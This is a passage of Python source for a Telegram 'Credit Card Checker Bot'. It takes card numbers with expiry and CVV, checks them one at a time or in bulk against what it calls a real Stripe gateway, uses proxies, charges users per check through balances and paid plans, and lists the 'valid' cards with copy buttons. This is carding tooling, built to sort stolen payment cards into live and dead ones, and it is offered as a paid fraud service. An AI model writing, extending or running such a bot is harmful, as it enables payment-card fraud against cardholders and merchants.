            if user.plan == PlanType.TRIAL and user.check_count >= 100:
                await update.message.reply_text(
                    "❌ Trial limit reached!\n"
                    "You've used all 100 free checks.\n"
                    f"Contact {ADMIN_USERNAME} to upgrade."
                )
                return
            elif user.balance <= 0:
                await update.message.reply_text(
                    f"❌ Insufficient balance!\n"
                    f"Your balance: ${user.balance:.2f}\n"
                    f"Add funds to continue checking."
                )
                return
        
        # Send processing message
        processing_msg = await update.message.reply_text(
            "🔍 Checking card...",
            parse_mode=ParseMode.HTML
        )
        
        # Check card
        result = await self.checker.check_single_card(card_data, user.user_id)
        
        if result.get('error'):
            await processing_msg.edit_text(
                f"❌ {result['error']}",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Update user balance
        cost = user.deduct_balance(1)
        self.db.update_user(user)
        
        # Format result with your requested style
        status_icon = "✅" if result['status'] == "APPROVED" else "❌"
        status_text = "APPROVED ✅" if result['status'] == "APPROVED" else "DELINED ❌"
        
        formatted = f"""
<code>┌──────────────────────────────┐
│       CARD CHECK RESULT      │
├──────────────────────────────┤
│ Status ➜ {status_text}
│ 
│ Card ➜ {result['full_card']}
│ 
│ Gateway ➜ {result['gateway']}
│ Response ➜ {result['response']}
│ 
│ Brand ➜ {result['bin_info']['brand']}
│ Bank ➜ {result['bin_info']['bank']}
│ Country ➜ {result['bin_info']['country']} {result['bin_info']['emoji']}
│ 
│ User ➜ {user.first_name}
│ Dev ➜ {ADMIN_USERNAME}
│ 
│ Cost ➜ ${cost:.2f}
│ Balance ➜ ${user.balance:.2f}
└──────────────────────────────┘</code>
"""
        
        # Create keyboard with copy button
        keyboard = [
            [
                InlineKeyboardButton(
                    "📋 Copy Card", 
                    callback_data=f"copy_{result['full_card']}"
                )
            ]
        ]
        
        if result['status'] == "APPROVED":
            keyboard[0].append(
                InlineKeyboardButton(
                    "✅ Valid", 
                    callback_data="valid_card"
                )
            )
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await processing_msg.edit_text(
            formatted,
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )
    
    async def mchk_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Check multiple cards"""
        user = await self._get_or_create_user(update.effective_user)
        
        if not context.args:
            await update.message.reply_text(
                f"<b>Usage: /mchk card1 card2 card3</b>\n"
                f"Max cards: {MAX_CARDS_PER_CHECK}\n\n"
                f"<b>Example:</b>\n"
                f"<code>/mchk 4741651674507906|05|33|802 5312600500055826|01|30|769</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Parse cards - split by whitespace
        cards_text = ' '.join(context.args)
        cards = [card.strip() for card in cards_text.split() if card.strip()]
        
        # Limit to max cards
        if len(cards) > MAX_CARDS_PER_CHECK:
            await update.message.reply_text(
                f"⚠️ Limiting to first {MAX_CARDS_PER_CHECK} cards."
            )
            cards = cards[:MAX_CARDS_PER_CHECK]
        
        if not cards:
            await update.message.reply_text("❌ No valid cards found!")
            return
        
        # Check user balance
        if not user.can_check_cards(len(cards)):
            if user.plan == PlanType.TRIAL:
                remaining = 100 - user.check_count
                await update.message.reply_text(
                    f"❌ Trial limit exceeded!\n"
                    f"You can only check {remaining} more cards.\n"
                    f"Contact {ADMIN_USERNAME} to upgrade."
                )
                return
            else:
                await update.message.reply_text(
                    f"❌ Insufficient balance for {len(cards)} cards!\n"
                    f"Your balance: ${user.balance:.2f}"
                )
                return
        
        # Start checking
        processing_msg = await update.message.reply_text(
            f"🔍 Checking {len(cards)} cards...",
            parse_mode=ParseMode.HTML
        )
        
        # Check all cards
        results = []
        valid_cards = []
        
        for i, card_data in enumerate(cards, 1):
            result = await self.checker.check_single_card(card_data, user.user_id)
            results.append(result)
            
            if result.get('status') == "APPROVED":
                valid_cards.append(result['full_card'])
            
            # Update progress
            if i % 5 == 0 or i == len(cards):
                progress = f"⏳ {i}/{len(cards)} cards checked..."
                await processing_msg.edit_text(progress, parse_mode=ParseMode.HTML)
            
            # Small delay to simulate real checking
            await asyncio.sleep(0.5)
        
        # Update user balance
        cost = user.deduct_balance(len(cards))
        self.db.update_user(user)
        
        # Calculate stats
        approved = sum(1 for r in results if r.get('status') == 'APPROVED')
        declined = len(cards) - approved
        
        # Format summary with your requested style
        summary = f"""
<code>┌──────────────────────────────┐
│     MULTI-CHECK RESULTS     │
├──────────────────────────────┤
│ Total Checked ➜ {len(cards)}
│ Approved ➜ {approved} ✅
│ Declined ➜ {declined} ❌
│ Success Rate ➜ {(approved/len(cards)*100):.1f}%
│ 
│ Cost ➜ ${cost:.2f}
│ Balance ➜ ${user.balance:.2f}
│ User ➜ {user.first_name}
│ Dev ➜ {ADMIN_USERNAME}
└──────────────────────────────┘</code>
"""
        
        # Add valid cards section
        if valid_cards:
            summary += f"\n\n<code>✅ VALID CARDS ({len(valid_cards)}):</code>\n"
            for i, card in enumerate(valid_cards, 1):
                summary += f"<code>{i}. {card}</code>\n"
            
            # Create keyboard for copying
            if valid_cards:
                keyboard = [[
                    InlineKeyboardButton(
                        "📋 Copy All Valid", 
                        callback_data=f"copy_all_{len(valid_cards)}"
                    )
                ]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await processing_msg.edit_text(
                    summary,
                    reply_markup=reply_markup,
                    parse_mode=ParseMode.HTML
                )
            else:
                await processing_msg.edit_text(
                    summary,
                    parse_mode=ParseMode.HTML
                )
        else:
            await processing_msg.edit_text(
                summary,
                parse_mode=ParseMode.HTML
            )
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle regular messages"""
        text = update.message.text.strip()
        
        # Auto-detect card format and suggest /chk
        if '|' in text and len(text.split('|')) >= 4:
            await update.message.reply_text(
                "💳 <b>Card detected!</b>\n"
                "To check this card, use: <code>/chk " + text + "</code>",
                parse_mode=ParseMode.HTML
            )
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle callback queries"""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        
        if data.startswith("copy_"):
            card_data = data[5:]
            await query.message.reply_text(
                f"📋 Card copied to clipboard:\n"
                f"<code>{card_data}</code>",
                parse_mode=ParseMode.HTML
            )
        
        elif data.startswith("copy_all_"):
            count = data[9:]
            await query.message.reply_text(
                f"✅ {count} valid cards are listed above.\n"
                f"Click and hold each card to copy."
            )
        
        elif data == "check_card":
            await query.message.reply_text(
                "Send card in format: cc|mm|yy|cvv\n"
                "Example: 4031630326616991|02|30|862"
            )
        
        elif data == "show_balance":
            await self.balance_command(update, context)
        
        elif data == "show_plans":
            await self.plan_command(update, context)
        
        elif data == "show_proxy":
            await self.myproxy_command(update, context)
        
        elif data == "test_proxy":
            user = await self._get_or_create_user(query.from_user)
            proxy = self.db.get_user_proxy(user.user_id)
            
            if proxy:
                await query.message.reply_text("🔍 Testing proxy...")
                is_working = await ProxyChecker.check_proxy(proxy)
                
                if is_working:
                    await query.message.reply_text("✅ Proxy is working!")
                else:
                    await query.message.reply_text("❌ Proxy is not working!")
            else:
                await query.message.reply_text("❌ No proxy configured!")
        
        elif data == "admin_stats":
            await self.stats_command(update, context)
        
        elif data == "admin_gencode":
            await query.message.reply_text(
                "Send: /gencode <amount> <plan>\n"
                "Example: /gencode 50 premium"
            )
        
        elif data == "admin_addbalance":
            await query.message.reply_text(
                "Send: /addbalance <user_id> <amount>\n"
                "Example: /addbalance 123456789 100"
            )
    
    # ========== UTILITY METHODS ==========
    async def _get_or_create_user(self, telegram_user):
        """Get or create user from database"""
        user = self.db.get_user(telegram_user.id)
        
        if not user:
            user = self.db.create_user(
                telegram_user.id,
                telegram_user.username or "",
                telegram_user.first_name or "User"
            )
        
        # Ensure admin user has admin rights
        if telegram_user.id == ADMIN_USER_ID:
            if not user.is_admin:
                user.is_admin = True
                self.db.update_user(user)
        
        return user
    
    def run(self):
        """Run the bot"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║      🤖 CREDIT CARD CHECKER BOT - PROFESSIONAL EDITION      ║
║                                                              ║
║        🔒 Real Stripe API • Professional UI                 ║
║        💰 Balance System • Proxy Support                    ║
║        🎫 Redeem Codes • Multi-Card Checking                ║
║                                                              ║
║        👨‍💻 Developer: @Mr_Proffesser                        ║
║        📧 Contact for support & updates                     ║
╚══════════════════════════════════════════════════════════════╝
""")
        
        print("🚀 Starting bot...")
        print(f"📁 Database: {DATABASE_FILE}")
        print(f"👑 Admin ID: {ADMIN_USER_ID}")
        print(f"📛 Admin Username: {ADMIN_USERNAME}")
        print("✅ Bot is running! Press Ctrl+C to stop")
        print("=" * 60)
        
        # Run the bot
        self.application.run_polling(allowed_updates=Update.ALL_TYPES)

# ============================ MAIN ============================
if __name__ == "__main__":
    try:
        bot = CardCheckerBot()
        bot.run()
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")
